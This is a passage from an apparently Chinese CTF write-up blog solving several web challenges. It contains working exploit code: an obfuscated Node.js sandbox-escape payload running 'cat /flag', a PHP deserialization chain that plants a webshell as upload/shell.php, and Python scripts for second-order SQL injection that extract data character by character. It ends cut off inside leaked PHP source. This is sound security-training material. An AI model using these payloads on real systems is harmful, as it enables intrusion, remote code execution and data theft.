class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>直接传入code即可拿到flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728101219868.png"></p><blockquote><p>flag{b127495d-efaa-4687-93c3-f7313aced510}</p></blockquote><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>注册账号后登录可上传文件，随便上传个🐎发现被转成<code>.png</code>后缀了。</p><p>一般这种题都会给源码的，直接上<code>dirsearch</code>，可以扫出个<code>www.tar.gz</code>。</p><h3 id="文件上传-反序列化"><a href="#文件上传-反序列化" class="headerlink" title="文件上传 + 反序列化"></a>文件上传 + 反序列化</h3><p>在<code>index.php</code>的login_check()里发现了<code>unserialize()</code>函数，口子就在这了，入口是cookie中的user参数。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728170223326.png"></p><p>有口子了就看看反序列化的利用函数，<code>Register.php</code>里有个<code>__destruct</code>，<code>$registed和$checker是可控的</code>，这里很明显是能当做跳板调用<code>__call</code>方法。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728170418639.png"></p><p>看看<code>__call</code>方法，这里<code>$arguments</code>参数为空，<code>$name=index</code>，于是就形成了<code>$this-&gt;&#123;$this-&gt;index&#125;();</code>，使用了一个不存在的键，会调用<code>__get</code>方法。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728170517637.png"></p><p>这样<code>$except</code>参数就可控了，可控了就说明我们可以调用这个类中的任意函数，这里就要看到<code>upload_img()</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个if，由于<code>$checker</code>参数可控，可以绕过。</p><p>第二个if，当我们未使用POST方式传入文件，而直接使用GET方法时，<code>$_FILES</code>为空，可以绕过。</p><p>最后一个if，是我们需要进入的，<code>$ext</code>参数可控，可以进入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">    <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入最后这个if，有个<code>copy()</code>函数。</p><blockquote><p>bool <strong>copy</strong>    ( string <code>$source</code>   , string <code>$dest</code>   [, resource <code>$context</code>  ] )</p><p>将文件从 <code>source</code> 拷贝到 <code>dest</code>。   </p><p>如果要移动文件的话，请使用 <a href="mk:@MSITStore:C:\Users\violet\Desktop\study\PHP7中文手册.chm::/res/function.rename.html">rename()</a> 函数。 </p></blockquote><p>那么我们就可以将我们先传入的图片🐎，拷贝到一个文件中，且文件类型我们可控，那就简单了。</p><p>先传入图片🐎，然后拷贝的文件名为一个php文件，即可造成文件上传攻击，直接给poc。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span> = <span class="string">&quot;./upload/1f14e65dbcd17d7e2d5ffae185e31c64/1c26eabfc7eed920dad40569148bd24f.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;upload/shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span> = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$x</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$x</span>));</span><br></pre></td></tr></table></figure><p>得到的字符串在cookie中传入。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728173558005.png"></p><p>会报错，但是🐎已经上传成功了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728173813027.png"></p><p>可以直接拿flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728173911221.png"></p><blockquote><p>flag{2e20594a-2d06-4fe8-8040-cc59a02cdfda}</p></blockquote><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>总共有<code>login.php</code>，<code>register.php</code>，<code>index.php</code>三个文件，搜源码没有搜出来，题目也没给提示，注册后username会显示在index.php里，那这就有可能实现二次注入。</p><h3 id="from-for-逗号绕过-加号绕注释"><a href="#from-for-逗号绕过-加号绕注释" class="headerlink" title="from for 逗号绕过  + 加号绕注释"></a>from for 逗号绕过  + 加号绕注释</h3><p>这题ban东西很严重，逗号没了，information_schema也没了。</p><p>逗号可用用from for绕过，即</p><p>substr(str,1,1) =&gt; substr(str from 1 for 1)</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210730133522771.png"></p><p>mysql中数字与字符相加会将字符转为数字，再进行相加</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210730133843357.png"></p><p>这样我们就能用加号注释掉后面的命令，二次注入要注意<code>email</code>与<code>password</code>，这里直接给爆库脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://542290f5-8044-47f2-a502-a7a50001607f.node4.buuoj.cn/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">reg = <span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetINFO</span>(<span class="params">url</span>):</span></span><br><span class="line">    INFO = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        register_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;2@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;0&#x27; + ascii(substr((select database()) from <span class="subst">&#123;i&#125;</span> for 1)) + &#x27;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        register = requests.post(url=url + <span class="string">&quot;register.php&quot;</span>, data=register_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;2@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">while</span> login.status_code != <span class="number">200</span>:</span><br><span class="line">            login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        result = re.search(reg, login.text)</span><br><span class="line">        INFO += <span class="built_in">chr</span>(<span class="built_in">int</span>(result.group(<span class="number">1</span>)))</span><br><span class="line">        print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;INFO&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> INFO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = GetINFO(URL)</span><br><span class="line">    print(<span class="string">f&quot;[+]Final Result is: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>但是这题把information_schema给ban了，而且<code>mysql.innodb_table_stats</code>和<code>sys.schema_table_statistics</code>都用不了，合着要猜是吧= =，查师傅们给的WP都是直接给flag表的，攻防世界官方的甚至还用了<code>information_schema</code>，脚本都跑不动，服了。</p><p>最后放个拿flag的脚本，只能说还是学了一点点东西了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://542290f5-8044-47f2-a502-a7a50001607f.node4.buuoj.cn/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">reg = <span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetINFO</span>(<span class="params">url</span>):</span></span><br><span class="line">    INFO = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        register_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;1@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;0&#x27; + ascii(substr((select * from flag) from <span class="subst">&#123;i&#125;</span> for 1)) + &#x27;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        register = requests.post(url=url + <span class="string">&quot;register.php&quot;</span>, data=register_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;1@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">while</span> login.status_code != <span class="number">200</span>:</span><br><span class="line">            login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        result = re.search(reg, login.text)</span><br><span class="line">        INFO += <span class="built_in">chr</span>(<span class="built_in">int</span>(result.group(<span class="number">1</span>)))</span><br><span class="line">        print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;INFO&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> INFO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = GetINFO(URL)</span><br><span class="line">    print(<span class="string">f&quot;[+]Final Result is: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{a0fc974d-cfb0-4811-a9ba-f294d06a2008}</p></blockquote><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><h3 id="www-zip文件泄露-php反序列化字符逃逸"><a href="#www-zip文件泄露-php反序列化字符逃逸" class="headerlink" title="www.zip文件泄露 + php反序列化字符逃逸"></a>www.zip文件泄露 + php反序列化字符逃逸</h3><p>www.zip泄露出源码，可利用的有update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$users</span>-&gt;update();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和lib.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    str_replace(<span class="variable">$array</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$parm</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$mysqli</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$mysqli</span>-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;id) &#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span 